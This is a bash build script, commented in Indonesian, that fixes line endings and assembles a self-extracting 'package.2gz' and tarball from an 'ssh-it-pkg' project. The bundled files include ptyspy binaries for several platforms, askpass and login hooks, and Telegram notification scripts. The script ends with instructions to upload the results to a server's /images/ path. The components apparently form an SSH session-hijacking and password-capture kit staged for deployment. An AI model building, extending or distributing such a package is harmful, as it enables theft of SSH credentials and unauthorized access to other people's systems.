#!/bin/bash
# Jalankan script ini sebelum upload ke server
# Menghapus Windows CRLF (\r) dari semua file teks

PROJ_DIR="$(cd "$(dirname "$0")" && pwd)"

echo "Fixing line endings di: $PROJ_DIR"

FILES=(
    "$PROJ_DIR/x"
    "$PROJ_DIR/ssh-it-pkg/x.sh"
    "$PROJ_DIR/ssh-it-pkg/hook.sh"
    "$PROJ_DIR/ssh-it-pkg/login_monitor.sh"
    "$PROJ_DIR/ssh-it-pkg/telegram_notify.sh"
    "$PROJ_DIR/ssh-it-pkg/telegram.cfg"
    "$PROJ_DIR/ssh-it-pkg/funcs"
    "$PROJ_DIR/ssh-it-pkg/ssh_login.sh"
    "$PROJ_DIR/ssh-it-pkg/askpass.sh"
    "$PROJ_DIR/ssh-it-pkg/thc_cli"
)

for f in "${FILES[@]}"; do
    if [[ -f "$f" ]]; then
        sed -i 's/\r$//' "$f"
        if grep -qP '\r' "$f" 2>/dev/null; then
            echo "  GAGAL: $(basename $f) masih ada CRLF"
        else
            echo "  OK: $(basename $f)"
        fi
    else
        echo "  SKIP: $(basename $f) tidak ditemukan"
    fi
done

echo ""
echo "Rebuilding package.2gz..."
cd "$PROJ_DIR/ssh-it-pkg"
FSIZE=$(stat -c%s x.sh)
cat x.sh > package.2gz
tar cfhz - --owner=0 --group=0 \
  x.sh hook.sh funcs thc_cli ssh_login.sh askpass.sh \
  telegram_notify.sh login_monitor.sh telegram.cfg \
  ptyspy_bin.aarch64-linux ptyspy_bin.armv6l-linux \
  ptyspy_bin.i386-alpine ptyspy_bin.mips32-alpine \
  ptyspy_bin.mips64-alpine ptyspy_bin.x86_64-alpine \
  ptyspy_bin.x86_64-osx >> package.2gz
echo "  package.2gz: $(du -h package.2gz | cut -f1)"

echo ""
echo "Rebuilding ssh-it-pkg.tar.gz..."
cd "$PROJ_DIR"
tar czf ssh-it-pkg.tar.gz ssh-it-pkg/
echo "  ssh-it-pkg.tar.gz: $(du -h ssh-it-pkg.tar.gz | cut -f1)"

echo ""
echo "SELESAI. Upload file berikut ke server:"
echo "  - x              -> upload ke /images/x"
echo "  - ssh-it-pkg.tar.gz -> upload ke /images/ssh-it-pkg.tar.gz"
